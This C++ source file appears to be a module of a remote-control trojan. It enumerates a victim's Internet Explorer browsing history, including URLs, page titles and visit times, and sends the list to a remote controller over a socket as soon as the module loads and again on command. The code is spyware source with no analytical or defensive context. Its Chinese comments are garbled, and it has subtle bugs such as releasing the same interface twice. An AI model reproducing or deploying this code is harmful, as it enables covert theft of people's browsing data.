
#include "UrlManager.h"
#include "urlhist.h"
#include "comdef.h"
#include <UrlHist.h>  // IUrlHistoryStg2 
#include <shlobj.h>   // CLSID_CUrlHistory, SHAddToRecentDocs
#include <atlbase.h>  // USES_CONVERSION;
#include<iostream>
#include<atltime.h>
using namespace std;


CUrlManager::CUrlManager(CClientSocket *pClient) : CManager(pClient)
{
	SendUrlList();

}

CUrlManager::~CUrlManager()
{

}



void CUrlManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_XLIST:
		SendUrlList();
		break;
	default:
		break;
	}
}

void CUrlManager::SendUrlList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getUrlList();
	if (lpBuffer == NULL)
		return;	

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CUrlManager::getUrlList()
{
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	lpBuffer[0] = TOKEN_XLIST;
	dwOffset = 1;


	HRESULT hr=S_FALSE;
	hr=CoInitialize(NULL);
	IUrlHistoryStg2	*puhs; 
	IEnumSTATURL	*pesu; 
	STATURL	 su; 
	ULONG	 celt; 
	_bstr_t	 bstr; 
	CString strTitle,strUrl,strTime;

	hr   =   ::CoCreateInstance(CLSID_CUrlHistory,   NULL,   CLSCTX_INPROC_SERVER,   IID_IUrlHistoryStg,   (LPVOID   *)&puhs); 
	DWORD wd = GetLastError();
	if(SUCCEEDED(hr)) 
	{ 
		hr   =   puhs-> EnumUrls(&pesu); 
		if(SUCCEEDED(hr)) 
		{ 
			while(SUCCEEDED(pesu-> Next(1,   &su,   &celt))   &&   celt   >   0) 
			{ 
				strUrl = su.pwcsUrl;

				if (strUrl.Find(_T("http:")) == 0 || strUrl.Find(_T("ftp:")) == 0 || strUrl.Find(_T("https:")) == 0)
				{
					if(su.pwcsTitle) 
						strTitle = su.pwcsTitle;
					else 
						strTitle = _T( "�ޱ���");

					CTime ct(su.ftLastVisited);
					CString time;
					time = ct.Format("%Y��%m��%d�� %H:%M:%S");
					strTime = time;

					dwLength = lstrlen(strTitle.GetBuffer()) + lstrlen(strUrl.GetBuffer()) + lstrlen(strTime.GetBuffer()) + 3;

					// ������̫С�������·�����
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

					// ����
					memcpy(lpBuffer + dwOffset, strTitle.GetBuffer(), lstrlen(strTitle.GetBuffer()) + 1);
					dwOffset += lstrlen(strTitle.GetBuffer()) + 1;

					// ��ַ
					memcpy(lpBuffer + dwOffset,strUrl.GetBuffer(), lstrlen(strUrl.GetBuffer()) + 1);
					dwOffset += lstrlen(strUrl.GetBuffer()) + 1;

					// ʱ��
					memcpy(lpBuffer + dwOffset, strTime.GetBuffer(), lstrlen(strTime.GetBuffer()) + 1);
					dwOffset += lstrlen(strTime.GetBuffer()) + 1;
				}
				else
					continue;

			} 
			puhs-> Release(); 
		} 
		puhs-> Release(); 
	} 

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}
